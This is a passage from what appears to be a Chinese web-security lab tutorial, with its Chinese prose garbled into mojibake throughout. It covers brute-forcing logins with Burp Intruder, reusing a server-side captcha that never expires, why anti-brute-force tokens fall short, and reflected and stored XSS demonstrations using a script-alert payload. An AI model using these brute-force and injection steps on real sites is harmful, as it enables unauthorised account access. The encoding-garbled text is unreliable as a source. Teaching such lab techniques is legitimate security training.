æ¥ä¸‹æ¥ï¼Œå°±ä¸åŸºäºè¡¨å•çš„æµç¨‹ä¸€æ ·ï¼Œå‘é€æ•°æ®åŒ…åˆ°Intruderä¸­ï¼Œé€‰ç”¨Cluster bombæ¨¡å¼ä¿®æ”¹å˜é‡ï¼Œå› ä¸ºéªŒè¯ç åå°å¹¶ä¸æ ¡éªŒæ²¡æœ‰ç”¨ï¼Œæ‰€ä»¥åªç”¨é€‰æ‹©ç”¨æˆ·åä¸å¯†ç ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fab5f4146a4064fdaa0600517e18295dd.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åœ¨payloadä¸­å¯¼å…¥å­—å…¸è¿›è¡Œçˆ†ç ´ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F79d9053bc8604229ae8cded76728b4c6.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¿›è¡Œé•¿åº¦æ’åºï¼Œæ ¹æ®æ•°æ®åŒ…é•¿åº¦ä¸åŒï¼Œæ‰¾åˆ°å¯èƒ½çš„å¯†ç ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F261677a77b074074b06e3a7597846732.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¾“å…¥ç”¨æˆ·åï¼Œå¯†ç å’ŒéªŒè¯ç ï¼Œç ´è§£æˆåŠŸã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3762cd99379f4f5aa47a9213f3ec1326.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
**ä¸å®‰å…¨çš„éªŒè¯ç - on clientå¸¸è§é—®é¢˜**-
â—ä½¿ç”¨å‰ç«¯jså®ç°éªŒè¯ç (çº¸è€è™) ;-
â—å°†éªŒè¯ç åœ¨cookieä¸­æ³„éœ²,å®¹æ˜“è¢«è·å–;-
â—å°†éªŒè¯ç åœ¨å‰ç«¯æºä»£ç ä¸­æ³„éœ²ï¼Œå®¹æ˜“è¢«è·å–;-
**ä¸å®‰å…¨çš„éªŒè¯ç - on server-æ¼”ç¤º**-
éšæœºè¾“å…¥è´¦å·å¯†ç ï¼Œè¾“å…¥ç›¸åº”éªŒè¯ç ï¼Œåˆ©ç”¨burpæŠ“åŒ…ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4b20d18efa6c4e45a5e075c56aeb5a69.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç™»å½•å¤±è´¥ï¼ŒéªŒè¯ç å‘ç”Ÿå˜åŒ–ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F236ceb6f300a4cd699ac143d1b9afd69.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

å°†æ•°æ®åŒ…å‘é€åˆ°repeaterï¼Œè¿›è¡Œåˆ¤æ–­ã€‚å°†éªŒè¯ç è®¾ç½®ä¸ºç©ºï¼Œç‚¹å‡»è¿è¡Œï¼Œå‡ºç°é”™è¯¯æç¤ºï¼ŒéªŒè¯ç ä¸èƒ½ä¸ºç©ºã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0d6f0978c7654a7a9f50919e09c80d7e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
éšæœºè¾“å…¥ä¸€ä¸ªéªŒè¯ç ï¼Œç‚¹å‡»è¿è¡Œï¼Œå‡ºç°é”™è¯¯æç¤ºï¼ŒéªŒè¯ç ä¸æ­£ç¡®ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7713325ee61e4e428e12b014d7929456.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç»è¿‡åˆ¤æ–­ï¼Œæˆ‘ä»¬å‘ç°åå°å¯¹éªŒè¯ç æœ‰è¿›è¡Œæ ¡éªŒï¼Œé‚£æ˜¯ä¸æ˜¯è¿™æ ·å°±æ²¡é—®é¢˜äº†å‘¢ï¼Ÿæ˜¾ç„¶ä¸æ˜¯è¿™æ ·ï¼Œä»è¡¨é¢ä¸Šçœ‹æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦å¯¹éªŒè¯ç æ˜¯å¦åœ¨åå°è¿‡æœŸè¿›è¡Œè¿›ä¸€æ­¥éªŒè¯ã€‚é¦–å…ˆå…ˆç‚¹å‡»éªŒè¯ç ï¼Œè·å–ä¸€ä¸ªæ–°çš„éªŒè¯ç ï¼Œå¹¶å°†å…¶è®°ä¸‹æ¥ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F285a7b08d2d44920830aaea35aa7490b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç„¶åè¿”å›æ•°æ®åŒ…ä¸­ï¼Œå°†æ­£ç¡®çš„éªŒè¯ç è¾“å…¥ã€‚ç‚¹å‡»è¿è¡Œï¼Œæç¤ºç”¨æˆ·åå’Œå¯†ç ä¸æ­£ç¡®ã€‚ä¸ºäº†éªŒè¯éªŒè¯ç æ˜¯å¦ä¸€è‡´æœ‰æ•ˆï¼Œæˆ‘ä»¬ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç ï¼ŒéªŒè¯ç ä¸å˜ï¼Œç‚¹å‡»è¿è¡Œï¼Œç»“æœä¸€æ ·ã€‚è¯´æ˜éªŒè¯ç å¯ä»¥é‡å¤åˆ©ç”¨ã€‚-
å°†æ•°æ®åŒ…å‘é€åˆ°Intruderï¼Œè®¾ç½®å˜é‡ç”¨æˆ·åå’Œå¯†ç ï¼ŒéªŒè¯ç åˆ™è¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œä¸è®¾ç½®å˜é‡ã€‚è¾“å…¥å­—å…¸è¿›è¡Œç ´è§£ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F36ca6fd9b9f0488e98dd4c03ae970211.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¿›è¡Œé•¿åº¦æ’åºï¼Œæ‰¾å‡ºæ­£ç¡®ç”¨æˆ·åä¸å¯†ç ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F5a316f79d3c549519982e9f6793014cf.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç™»é™†æˆåŠŸã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F9f4f728060c24b0d881ecf2e0049fd82.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

**ä¸å®‰å…¨çš„éªŒè¯ç -on serverå¸¸è§é—®é¢˜**-
â—éªŒè¯ç åœ¨åå°ä¸è¿‡æœŸï¼Œå¯¼è‡´å¯ä»¥é•¿æœŸè¢«ä½¿ç”¨;-
â—éªŒè¯ç æ ¡éªŒä¸ä¸¥æ ¼,é€»è¾‘å‡ºç°é—®é¢˜;-
â—éªŒè¯ç è®¾è®¡çš„å¤ªè¿‡ç®€å•å’Œæœ‰è§„å¾‹,å®¹æ˜“è¢«çŒœè§£

#### 3.1.5Tokenå¯ä»¥é˜²æš´åŠ›ç ´è§£å—?

ä¸€ä¸ªtokenç¤ºä¾‹

    //ç”Ÿæˆä¸€ä¸ªtokenï¼Œä»¥å½“å‰çš„æ—¶é—´ï¼‹ä¸€ä¸ª5ä½çš„å‰ç¼€
    function set_token(){
        if(isset($_SESSION['token'])){
            unset($_SESSION['token']);
            }
            $_SESSION['token']=str_replace('.','',uniqid(mt_rand(10000,99999),true));
      }
    
        

ä¸€èˆ¬çš„åšæ³•:-
1.å°†tokenä»¥"type=â€˜hiddenâ€™â€™â€çš„å½¢å¼è¾“å‡ºåœ¨è¡¨å•ä¸­;-
2.åœ¨æäº¤çš„è®¤è¯çš„æ—¶å€™ä¸€èµ·æäº¤ï¼Œå¹¶åœ¨åå°å¯¹å…¶è¿›è¡Œæ ¡éªŒ;-
ä½†ï¼Œç”±äºå…¶tokenå€¼è¾“å‡ºåœ¨äº†å‰ç«¯æºç ä¸­,å®¹æ˜“è¢«è·å–,å› æ­¤ä¹Ÿå°±å¤±å»äº†é˜²æš´åŠ›ç ´è§£çš„æ„ä¹‰ã€‚ä¸€èˆ¬Tokenåœ¨é˜²æ­¢CSRFä¸Šä¼šæœ‰æ¯”è¾ƒå¥½çš„åŠŸæ•ˆï¼Œå…·ä½“è®²åœ¨CSRFæ¼æ´ç« èŠ‚è¿›è¡Œè®²è§£ã€‚

#### 3.1.6æš´åŠ›ç ´è§£å¸¸è§çš„é˜²èŒƒæªæ–½

é˜²æš´åŠ›ç ´è§£çš„æªæ–½æ€»ç»“-
â—è®¾è®¡å®‰å…¨çš„éªŒè¯ç (å®‰å…¨çš„æµç¨‹+å¤æ‚è€Œåˆå¯ç”¨çš„å›¾å½¢) ;-
â—å¯¹è®¤è¯é”™è¯¯çš„æäº¤è¿›è¡Œè®¡æ•°å¹¶ç»™å‡ºé™åˆ¶,æ¯”å¦‚è¿ç»­5æ¬¡å¯†ç é”™è¯¯,é”å®š2å°æ—¶;-
â—å¿…è¦çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨åŒå› ç´ è®¤è¯;

## 3.2 XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»æ¼æ´ï¼‰
#### 3.2.1è·¨ç«™è„šæœ¬æ¼æ´æ¦‚è¿°

â—XSSæ¼æ´ä¸€ç›´è¢«è¯„ä¼°ä¸ºwebæ¼æ´ä¸­å±å®³è¾ƒå¤§çš„æ¼æ´ï¼Œåœ¨OWASP TOP10çš„æ’åä¸­ä¸€ç›´å±äºå‰ä¸‰çš„æ±Ÿæ¹–åœ°ä½ã€‚-
â—XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨Webå‰ç«¯çš„æ¼æ´ï¼Œæ‰€ä»¥å…¶å±å®³çš„å¯¹è±¡ä¹Ÿä¸»è¦æ˜¯å‰ç«¯ç”¨æˆ·ã€‚-
â—XSSæ¼æ´å¯ä»¥ç”¨æ¥<span style="background:#ffff00">è¿›è¡Œé’“é±¼æ”»å‡»ã€é’“é±¼æ”»å‡»ã€å‰ç«¯jsæŒ–çŸ¿ã€ç”¨æˆ·cookieè·å–ã€‚ç”šè‡³å¯ä»¥ç»“åˆæµè§ˆå™¨è‡ªèº«çš„æ¼æ´å¯¹ç”¨æˆ·ä¸»æœºè¿›è¡Œè¿œç¨‹æ§åˆ¶ç­‰</span>-
**XSS(çªƒå–cookie)æ”»å‡»æµç¨‹**-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc3bfb76b27ee42bd8b3ec8dc9c8e86e7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.2è·¨ç«™è„šæœ¬æ¼æ´ç±»å‹åŠæµ‹è¯•æµç¨‹

**è·¨ç«™è„šæœ¬æ¼æ´å¸¸è§ç±»å‹**

**å±å®³:å­˜å‚¨å‹>åå°„å‹> DOMå‹**

â—åå°„å‹-
äº¤äº’çš„æ•°æ®ä¸€èˆ¬ä¸ä¼šè¢«å­˜åœ¨åœ¨æ•°æ®åº“é‡Œé¢,==ä¸€æ¬¡æ€§==,æ‰€è§å³æ‰€å¾—ï¼Œä¸€èˆ¬å‡ºç°åœ¨æŸ¥è¯¢ç±»é¡µé¢ç­‰ã€‚-
â—å­˜å‚¨å‹-
äº¤äº’çš„æ•°æ®ä¼šè¢«å­˜åœ¨åœ¨æ•°æ®åº“é‡Œé¢ï¼Œ==æ°¸ä¹…æ€§å­˜å‚¨==ï¼Œä¸€èˆ¬å‡ºç°åœ¨ç•™è¨€æ¿ï¼Œæ³¨å†Œç­‰é¡µé¢ã€‚-
â—DOMå‹-
ä¸ä¸åå°æœåŠ¡å™¨äº§ç”Ÿæ•°æ®äº¤äº’,æ˜¯ä¸€ç§é€šè¿‡DOMæ“ä½œ==å‰ç«¯ä»£ç è¾“å‡ºçš„æ—¶å€™äº§ç”Ÿçš„é—®é¢˜,ä¸€æ¬¡æ€§ä¹Ÿå±äºåå°„å‹ã€‚==

**xssæ¼æ´å½¢æˆçš„åŸå› :**-
å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹==è¾“å…¥å’Œè¾“å‡ºçš„æ§åˆ¶ä¸å¤Ÿä¸¥æ ¼,å¯¼è‡´â€œç²¾å¿ƒæ„é€ "çš„è„šæœ¬è¾“å…¥å,åœ¨è¾“åˆ°å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³==ã€‚

**è·¨ç«™è„šæœ¬æ¼æ´æµ‹è¯•æµç¨‹:**-
â‘ åœ¨<span style="background:#ffff00">ç›®æ ‡ç«™ç‚¹ä¸Šæ‰¾åˆ°è¾“å…¥ç‚¹</span>,æ¯”å¦‚æŸ¥è¯¢<span style="background:#ffff00">æ¥å£,ç•™è¨€æ¿</span>ç­‰;-
â‘¡è¾“å…¥ä¸€ç»„<span style="background:#ffff00">â€ç‰¹æ®Šå­—ç¬¦+å”¯ä¸€è¯†åˆ«å­—ç¬¦â€</span>, ç‚¹å‡»<span style="background:#ffff00">æäº¤</span>å,<span style="background:#ffff00">æŸ¥çœ‹</span>è¿”å›çš„<span style="background:#ffff00">æºç </span>ï¼Œæ˜¯å¦æœ‰åšå¯¹åº”çš„å¤„ç†;-
â‘¢é€šè¿‡æœç´¢<span style="background:#ffff00">å®šä½åˆ°å”¯ä¸€å­—ç¬¦</span>ï¼Œç»“åˆå”¯ä¸€å­—ç¬¦å‰åè¯­æ³•<span style="background:#ffff00">ç¡®è®¤æ˜¯å¦å¯ä»¥æ„é€ æ‰§è¡Œjsçš„æ¡ä»¶ (æ„é€ é—­åˆ)</span> ;-
â‘£æäº¤æ„é€ çš„<span style="background:#ffff00">è„šæœ¬ä»£ç (ä»¥åŠå„ç§ç»•è¿‡å§¿åŠ¿)</span>ï¼Œçœ‹<span style="background:#ffff00">æ˜¯å¦å¯ä»¥æˆåŠŸæ‰§è¡Œ</span>ï¼Œå¦‚æœ<span style="background:#ffff00">æˆåŠŸæ‰§è¡Œåˆ™è¯´æ˜å­˜åœ¨XSSæ¼æ´</span>;

æç¤ºï¼š-
1.ä¸€èˆ¬æŸ¥è¯¢æ¥å£å®¹æ˜“å‡ºç°åå°„å‹XSS ,ç•™è¨€æ¿å®¹æ˜“å‡ºç°å­˜å‚¨å‹XSS ;-
2.ç”±äºåå°å¯èƒ½å­˜åœ¨è¿‡æ»¤æªæ–½ï¼Œæ„é€ çš„scriptå¯èƒ½ä¼šè¢«è¿‡æ»¤æ‰,è€Œæ— æ³•ç”Ÿæ•ˆæˆ–è€…ç¯å¢ƒé™åˆ¶äº†æ‰§è¡Œ(æµè§ˆå™¨) ;-
3.é€šè¿‡å˜åŒ–ä¸åŒçš„script ,å°è¯•ç»•è¿‡åå°è¿‡æ»¤æœºåˆ¶;

#### 3.2.3åå°„å‹XSS ( get&post )æ¼”ç¤º

åœ¨å¯¹åº”çš„è¾“å…¥ç‚¹è¾“å…¥ç‰¹æ®Šå­—ç¬¦å¦‚ï¼š_;"â€™<>9999_-
ç›®çš„å°±æ˜¯çœ‹ä¸€çœ‹æ˜¯å¦ä¼šè¢«è¿‡æ»¤ï¼Œï¼ˆå› ä¸ºæˆ‘ä»¬å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼‰æœ‰æ²¡æœ‰è¢«è¾“å‡ºï¼Œæœ‰æ²¡æœ‰è¢«å¤„ç†ã€‚ç‚¹å‡»æäº¤ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F344af51175cc49a5911378312a59fccf.png)-
æŸ¥çœ‹é¡µå†…æºç ï¼ŒCTRL+Fåœ¨é¡µé¢å†…æŸ¥æ‰¾æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8aee355988f84fffa7084596f6db8d0b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¢«åŸå°ä¸åŠ¨çš„è¾“å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬è¾“å…¥æ­£ç¡®çš„JavaScriptè¯­å¥å°±æœ‰å¯èƒ½ä¼šè¢«åŸå°ä¸åŠ¨çš„è¿”å›ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fadc2f96ae0e740d0934f80f76c2de901.png)-
è¯­å¥è¾“å…¥åˆ°ä¸€åŠæ—¶ï¼Œå‘ç°ä¸èƒ½è¾“å…¥äº†ï¼ŒåŸå› æ˜¯å¯¹é•¿åº¦è¿›è¡Œäº†é™åˆ¶ã€‚è¿™æ˜¯åœ¨å‰ç«¯çš„å®‰å…¨è®¾ç½®ï¼Œæ„ä¹‰ä¸æ˜¯å¾ˆå¤§ã€‚å…µæ¥å°†æŒ¡æ°´æ¥åœŸæ©ï¼Œåœ¨è®¾ç½®ä¸­æ‰“å¼€webå¼€å‘è€…å·¥å…·ï¼ŒæŸ¥æ‰¾è¾“å…¥æ¡†è¯­å¥ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1732a2f9a94e431b8aa3a571b805470f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å¯ä»¥çœ‹åˆ°é•¿åº¦ä¸º20ï¼Œæˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸º2000å³å¯ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F29deadfee1ef476cb1280ce9a8e73b8f.png)-
è¾“å…¥ä»£ç `<script>alert('xss')</script>`ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è¾“å…¥æ¡†ä¸­çš„è¯­å¥è¢«æ‰§è¡Œï¼Œå‡ºç°äº†xsså¼¹çª—ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3f77538c32f542239e9e6cc979535167.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å› ä¸ºæ˜¯åå°„æ€§ï¼Œä¸€æ¬¡æ€§çš„ï¼Œåˆ·æ–°é¡µé¢ä¹‹åå¼¹çª—æ¶ˆå¤±ã€‚è¿™ä¸ªxsså®é™…ä¸Šæ˜¯ä»¥getçš„æ–¹å¼æäº¤çš„ã€‚

**GETå’ŒPOSTå…¸å‹åŒºåˆ«:**-
GETæ˜¯ä»¥urlæ–¹å¼æäº¤æ•°æ®;-
POSTæ˜¯ä»¥è¡¨å•æ–¹å¼åœ¨è¯·æ±‚ä½“é‡Œé¢æäº¤;

GETæ–¹å¼çš„XSSæ¼æ´æ›´åŠ å®¹æ˜“è¢«åˆ©ç”¨, ä¸€èˆ¬åˆ©ç”¨çš„æ–¹å¼æ˜¯å°†å¸¦æœ‰è·¨ç«™è„šæœ¬çš„URLä¼ªè£…åå‘é€ç»™ç›®æ ‡ï¼Œè€ŒPOSTæ–¹å¼ç”±äºæ˜¯ä»¥è¡¨å•æ–¹å¼æäº¤,æ— æ³•ç›´æ¥ä½¿ç”¨URLæ–¹å¼è¿›è¡Œæ”»å‡»ï¼Œå¦‚ä½•åˆ©ç”¨?å¯ä»¥æ€è€ƒä¸€ä¸‹3.2.6æ­æ™“ã€‚

#### 3.2.4å­˜å‚¨å‹XSSæ¼”ç¤º

<span style="background:#ffff00">å­˜å‚¨å‹XSSæ¼æ´è·Ÿåå°„å‹å½¢æˆçš„åŸå› ä¸€æ ·,ä¸åŒçš„æ˜¯å­˜å‚¨å‹XSSä¸‹æ”»å‡»è€…å¯ä»¥å°†è„šæœ¬æ³¨å…¥åˆ°åå°å­˜å‚¨èµ·æ¥ï¼Œæ„æˆæ›´åŠ æŒä¹…çš„å±å®³,å› æ­¤å­˜å‚¨å‹XSSä¹Ÿç§°â€œæ°¸ä¹…å‹â€XSSã€‚</span>

åœ¨ç•™è¨€ç‰ˆä¸Šè¯•ç€è¾“å…¥ç•™è¨€6666ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F06dd2633bcd644e5b8680a9674a929ba.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_10%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬å‘ç°ç•™è¨€è¢«åå°å­˜å‚¨ï¼Œå¹¶æ²¡æœ‰æ¶ˆå¤±ã€‚-
æŒ‰ä¹‹å‰çš„æ€è·¯ï¼Œæµ‹è¿™ä¸ªç•™è¨€æ¿æ˜¯å¦å­˜åœ¨xssæ¼æ´ï¼Œåœ¨ç•™è¨€æ¿è¾“å…¥ç‰¹æ®Šå­—ç¬¦ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F05fcefdd6b4946909800c177db902233.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_10%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ‰“å¼€é¡µé¢æºç ï¼ŒCTRL+Få»æœç´¢æˆ‘ä»¬è¾“å…¥å­—ç¬¦çš„ä½ç½®ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0f5b04478c2540919fb5db0a640c53cd.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ²¡æœ‰ä»»ä½•å¤„ç†ï¼Œç›´æ¥è¢«è¾“å‡ºã€‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªpayloadï¼Œä¸€ä¸ªå¼¹çª—ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc89513fe9a0b49f781f834dba0abe19e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_13%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç‚¹å‡»æäº¤ï¼Œæˆ‘ä»¬å‘ç°è¯­å¥è¢«æ‰§è¡Œå‡ºç°äº†å¼¹çª—ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ffffc3ede76e64fb8821d4c662d257ac1.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬è¿›è¡Œé¡µé¢åˆ‡æ¢ï¼Œç„¶åå†æ¬¡åˆ‡æ¢å›æ¥ï¼Œå‘ç°å¼¹çª—ä¾ç„¶å­˜åœ¨ï¼Œè¯´æ˜æˆ‘ä»¬è¾“å…¥çš„è¯­å¥å·²ç»è¢«å­˜å‚¨èµ·æ¥ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7ae7eb1ea883475183c537c8073a958b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é“ç†ä¸åå°„æ€§å·®ä¸å¤šï¼Œå”¯ä¸€åŒºåˆ«å°±æ˜¯æ°¸ä¹…å’Œä¸€æ¬¡æ€§ã€‚

#### 3.2.5Domå‹XSSæ¼”ç¤º

å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œåœ¨äº†è§£Domå‹xssï¼Œæˆ‘ä»¬å…ˆäº†è§£ä»€ä¹ˆæ˜¯DOMã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F405062d96f6046d29cc15f55c59e8666.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

é€šè¿‡JavaScriptï¼Œå¯ä»¥é‡æ„æ•´ä¸ªHTMLæ–‡æ¡£ã€‚å¯ä»¥æ·»åŠ ã€ç§»é™¤ã€æ”¹å˜æˆ–é‡æ’é¡µé¢ä¸Šçš„é¡¹ç›®ã€‚-
